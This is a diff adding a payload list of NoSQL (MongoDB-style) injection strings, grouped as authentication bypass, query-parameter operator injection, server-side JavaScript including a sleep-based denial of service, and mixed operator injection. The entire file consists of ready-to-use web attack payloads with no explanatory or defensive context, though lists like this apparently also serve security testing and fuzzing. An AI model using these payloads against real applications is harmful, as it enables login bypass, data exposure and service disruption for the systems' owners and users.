@@ -1,0 +1,36 @@
+# NoSQL Injection Payloads
+# Targets: MongoDB-style operators, auth bypass, server-side JavaScript, and query-key injection
+
+# === Authentication Bypass ===
+{"username":{"$ne":null},"password":{"$ne":null}}
+{"password":{"$gt":""}}
+{"user":{"$ne":""}}
+{"email":{"$eq":false}}
+{"active":{"$ne":true}}
+{"login":{"$lte":""}}
+{"account":{"$gte":null}}
+
+# === Query Parameter Operator Injection ===
+username[$ne]=admin
+password[$gt]=
+user[$exists]=true
+role[$in][]=admin
+filter[$or][0][admin]=true
+q[$regex]=.*
+profile[$where]=this.isAdmin
+
+# === Server-Side JavaScript / DoS ===
+{"$where":"sleep(5000)"}
+{"$where":"this.password.length>0"}
+{"$where":"return true"}
+{"q":{"$function":{"body":"function(){return true}"}}}
+{"q":{"$accumulator":{"init":"function(){return 1}"}}}
+{"mapReduce":"users"}
+{"mapreduce":"orders"}
+
+# === Mixed Operator Injection ===
+{"$or":[{"user":"admin"},{"password":{"$ne":null}}]}
+{"$and":[{"tenant":"default"},{"role":{"$ne":null}}]}
+{"query":{"username":{"$regex":".*"},"password":{"$ne":null}}}
+{"selector":{"$where":"function(){return this.admin == true}"}}
+{"criteria":{"$function":{"body":"x"}}}
